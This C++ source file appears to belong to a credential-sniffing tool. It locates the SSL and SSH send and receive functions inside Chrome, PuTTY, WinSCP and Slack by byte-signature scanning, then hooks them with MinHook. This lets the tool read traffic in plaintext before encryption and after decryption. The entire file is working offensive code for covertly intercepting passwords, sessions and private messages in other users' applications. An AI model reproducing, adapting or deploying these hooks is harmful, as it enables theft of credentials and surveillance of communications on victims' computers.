
#include "stdafx.h"
#include "NonExportedHooks.h"

// Chrome 64

void HookChrome(string p_sModule)
{
	SECTION_INFO rdata = {0, 0};
	SECTION_INFO text  = {0, 0};

	// 64 bits signatures

	unsigned char Write_Signature64[] = { 
		0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x44, 0x89, 0xC6, 0x48, 0x89, 0xD7, 
		0x48, 0x89, 0xCB, 0x48, 0x8B, 0x05, '?' , '?' , '?' , '?' , 0x48, 0x31, 0xE0, 0x48, 0x89, 0x44 };
	unsigned char Read_Signature64[] = {
		0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x44, 0x89, 0xC6, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCB, 
		0xE8, '?' , '?' , '?' , '?' , 0x85, 0xC0, 0x7E, '?' , 0x85, 0xF6, 0x7E, '?' , 0x48, 0x63, 0xCE };

	// 32 bits signatures

	unsigned char Write_Signature32[] = {
		0x55, 0x89, 0xE5, 0x53, 0x57, 0x56, 0x83, 0xEC, 0x08, 0xA1, '?' , '?' , '?' , '?' , 0x8B, 0x7D, 
		0x08, 0x31, 0xE8, 0x89, 0x45, 0xF0, 0x8B, 0x47, 0x18, 0xC7, 0x80, 0x98, 0x00, 0x00, 0x00, 0x01 };
	unsigned char Read_Signature32[] = {
		0x55, 0x89, 0xE5, 0x57, 0x56, 0x8B, 0x7D, 0x08, 0xFF, 0x75, 0x10, 0xFF, 0x75, 0x0C, 0x57, 0xE8, 
		'?' , '?' , '?' , '?' , 0x83, 0xC4, 0x0C, 0x89, 0xC6, 0x85, 0xC0, 0x7E, 0x21, 0x8B, 0x47, 0x18 };

	// Get section

	text  = Process::GetModuleSection(p_sModule, ".text");

	// Check if chrome

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome text section!");
		return;
	}

	// We have the x86 versions

	if (Utils::Is32BitProcess())
	{
		// Search memory
		
		ADDRESS_VALUE pWrite32 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature32, sizeof(Write_Signature32));
		ADDRESS_VALUE pRead32 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature32, sizeof(Read_Signature32));

		if (pRead32 == 0 || pWrite32 == 0)
		{
			DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
			return;
		}
		
		// Add hooks

		SSL_Write_Original = (SSL_Write_Typedef)pWrite32;
		SSL_Read_Original  = (SSL_Read_Typedef)pRead32;

		MH_CreateHook((void *)pWrite32, (void *)SSL_Write_Callback, (void **)&SSL_Write_Original);
		MH_CreateHook((void *)pRead32,  (void *)SSL_Read_Callback, (void **)&SSL_Read_Original);

		return;
	}
	else 
	{
		// Search memory

		ADDRESS_VALUE pWrite64 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature64, sizeof(Write_Signature64));
		ADDRESS_VALUE pRead64 = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature64, sizeof(Read_Signature64));

		if (pRead64 == 0 || pWrite64 == 0)
		{
			DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
			return;
		}
		
		// Add hooks

		SSL_Write_Original = (SSL_Write_Typedef)pWrite64;
		SSL_Read_Original = (SSL_Read_Typedef)pRead64;

		MH_CreateHook((void *)pWrite64, (void *)SSL_Write_Callback, (void **)&SSL_Write_Original);
		MH_CreateHook((void *)pRead64, (void *)SSL_Read_Callback, (void **)&SSL_Read_Original);

		return;
	}
}

// Hook Putty - (c) PuttyRider - Adrian Furtuna

void HookPutty()
{
	SECTION_INFO text  = {0, 0};

	// 32 bits signatures 

	unsigned char SEND_string32[] = { 0x55, 0x53, 0x57, 0x56, 0x83, 0xEC, 0x0C, 0x8B, 0x74, 0x24, 
		0x20, 0x8B, 0x7C, 0x24, 0x28, 0x83, 0x3E, 0x00, 0x75, 0x17 };
	unsigned char RECV_string32[] = { 0x56, 0x8B, 0x74, 0x24, 0x08, 0x8D, 0x46, 0x60, 0xFF, 0x74, 
		0x24, 0x14, 0xFF, 0x74, 0x24, 0x14, 0x50, 0xE8 };

	// 64 bits signatures

	unsigned char SEND_string64[] = { 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 
		0x55, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x45, 0x89, 0xCE, 0x45, 0x89, 0xC7, 0x49, 0x89, 0xD5 };
	unsigned char RECV_string64[] = { 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x48, 0x83, 
		0xE9, 0x80, 0x4C, 0x89, 0xC2, 0x45, 0x89, 0xC8, 0xE8 };

	//Get .text section

	text  = Process::GetModuleSection("", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty section!");
		return;
	}

	// Serach functions

	ADDRESS_VALUE pSend32 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string32, sizeof(SEND_string32));
	ADDRESS_VALUE pRecv32 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string32, sizeof(RECV_string32));

	ADDRESS_VALUE pSend64 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string64, sizeof(SEND_string64));
	ADDRESS_VALUE pRecv64 = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string64, sizeof(RECV_string64));

	// We have 32 bits version

	if(pSend32 && pRecv32)
	{
		// Add hooks

		PuttySend_Original = (PuttySend_Typedef)pSend32;
		PuttyRecv_Original = (PuttyRecv_Typedef)pRecv32;

		MH_CreateHook((void *)pSend32, (void *)PuttySend_Callback, (void **)&PuttySend_Original);
		MH_CreateHook((void *)pRecv32, (void *)PuttyRecv_Callback, (void **)&PuttyRecv_Original);
		return;
	}

	// We have 64 bits version

	if (pSend64 && pRecv64)
	{
		// Add hooks

		PuttySend_Original = (PuttySend_Typedef)pSend64;
		PuttyRecv_Original = (PuttyRecv_Typedef)pRecv64;

		MH_CreateHook((void *)pSend64, (void *)PuttySend_Callback, (void **)&PuttySend_Original);
		MH_CreateHook((void *)pRecv64, (void *)PuttyRecv_Callback, (void **)&PuttyRecv_Original);

		return;
	}

	DebugLog::Log("[ERROR] Cannot get Putty functions!");
}

// Hook WinSCP

void HookWinSCP()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = { 
		0x55, 0x8B, 0xEC, 0x83, 0xC4, 0x98, 0x53, 0x56, 0x57, 0x89, 0x4D, 0xB8, 0x8B, 0xF2, 0x8B, 0xD8, 
		0xB8,  '?',  '?',  '?',  '?', 0xE8,  '?',  '?',  '?',  '?', 0x83, 0xCA, 0xFF, 0x8B, 0xC3, 0xE8 };
	unsigned char RECV_string[] = { 
		0x55, 0x8B, 0xEC, 0x83, 0xC4, 0x8C, 0x53, 0x56, 0x57, 0x89, 0x4D, 0xAC, 0x8B, 0xDA, 0x89, 0x45, 
		0xB0, 0xB8,  '?',  '?',  '?',  '?', 0xE8,  '?',  '?',  '?',  '?', 0x83, 0xCA, 0xFF, 0x8B, 0x45 };

	// Get .text section

	text  = Process::GetModuleSection("winscp.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP section!");
		return;
	}

	// Search functions

	ADDRESS_VALUE pSend = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, sizeof(SEND_string));
	ADDRESS_VALUE pRecv = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, sizeof(RECV_string));

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP functions!");
		return;
	}

	// Add hooks

	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;

	MH_CreateHook((void *)pSend, (void *)SSH_Pktsend_Callback, (void **)&SSH_Pktsend_Original);
	MH_CreateHook((void *)pRecv, (void *)SSH_Rdpkt_Callback, (void **)&SSH_Rdpkt_Original);
}

// Hook Slack

void HookSlack()
{
	SECTION_INFO text = { 0, 0 };
	unsigned char SEND_string[] = {
		0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x41, 
		0x8B, 0xF8, 0xC7, 0x81, 0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF2, 0x48 };
	unsigned char RECV_string[] = {
		0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x6C, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 
		0x48, 0x83, 0xEC, 0x30, 0x41, 0x8B, 0xF9, 0xC7, 0x81, 0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00 };

	// Get .text section

	text = Process::GetModuleSection("slack.exe", ".text");

	if (text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Slack section!");
		return;
	}

	// Search functions

	ADDRESS_VALUE pSend = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, sizeof(SEND_string));
	ADDRESS_VALUE pRecv = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, sizeof(RECV_string));

	if (pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Slack functions!");
		return;
	}

	// Add hooks

	SSL_Write_Original = (SSL_Write_Typedef)pSend;
	SSL_Read_Original  = (SSL_Read_Typedef)pRecv;

	MH_CreateHook((void *)pSend, (void *)SSL_Write_Callback, (void **)&SSL_Write_Original);
	MH_CreateHook((void *)pRecv, (void *)SSL_Read_Callback, (void **)&SSL_Read_Original);
}

